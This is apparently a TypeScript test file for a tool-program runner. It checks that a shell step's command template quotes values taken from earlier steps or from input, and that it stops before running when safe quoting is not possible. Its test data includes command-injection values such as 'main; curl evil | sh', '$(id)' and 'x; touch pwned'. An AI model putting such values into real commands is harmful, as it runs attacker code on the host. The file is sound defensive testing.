import { describe, expect, test } from "bun:test";
import type { Binding, StretchProgram } from "@eden/ir";
import { registryFrom, runProgram } from "../src/index";

const FROM_FETCH: Binding = { kind: "from", step: "fetch", path: "" };

/** fetch, then `tool` with `key` = a template over `of`: the shape of issue #74. */
function program(tool: string, expr: string, of = FROM_FETCH, key = "command"): StretchProgram {
  return {
    id: "p",
    version: "v",
    name: "p",
    description: "p",
    inputSchema: { type: "object" },
    steps: [
      { id: "fetch", kind: "tool", tool: "fetch", args: {} },
      { id: "run", kind: "tool", tool, args: { [key]: { kind: "transform", fn: "template", expr, of } } },
    ],
    returns: { kind: "from", step: "run", path: "" },
    contract: { witnesses: 3, minLlmReduction: 2, allowExact: false },
    manifest: null,
  };
}

/** `fetch` answers `fetched`; `tool` records the argument it was handed. */
function registry(tool: string, fetched: Record<string, unknown>, seen: unknown[], key = "command") {
  return registryFrom({
    fetch: () => fetched,
    [tool]: (args) => {
      seen.push(args[key]);
      return {};
    },
  });
}

/** The witness envelope is not under test here. */
function run(p: StretchProgram, input: Record<string, unknown>, reg: ReturnType<typeof registry>) {
  return runProgram(p, input, { registry: reg, checkEnvelope: false });
}

describe("a shell step's command template", () => {
  test("quotes a slot value filled from a prior step's result", async () => {
    const seen: unknown[] = [];
    const fetched = { branch: "main; curl evil | sh" };
    await run(program("Bash", "git checkout {branch}"), {}, registry("Bash", fetched, seen));
    expect(seen).toEqual(["git checkout 'main; curl evil | sh'"]);
  });

  test("quotes a slot value filled from the program's input", async () => {
    const seen: unknown[] = [];
    const p = program("bash", "git log {branch}", { kind: "input", path: "" });
    await run(p, { branch: "$(id)" }, registry("bash", {}, seen));
    expect(seen).toEqual(["git log '$(id)'"]);
  });

  test("stops before the shell runs when a value cannot be quoted in its context", async () => {
    const seen: unknown[] = [];
    const p = program("Bash", "git checkout $(printf %s {branch})");
    await expect(run(p, {}, registry("Bash", { branch: "x; touch pwned" }, seen))).rejects.toMatchObject({
      deopt: true,
      stepsRun: 1,
    });
    expect(seen).toEqual([]);
  });

  test("leaves templates that no shell parses as they were", async () => {
    const seen: unknown[] = [];
    const fetched = { branch: "a; b" };
    await run(program("post_note", "note: {branch}"), {}, registry("post_note", fetched, seen));
    const p = program("Bash", "checkout {branch}", FROM_FETCH, "description");
    await run(p, {}, registry("Bash", fetched, seen, "description"));
    expect(seen).toEqual(["note: a; b", "checkout a; b"]);
  });
});
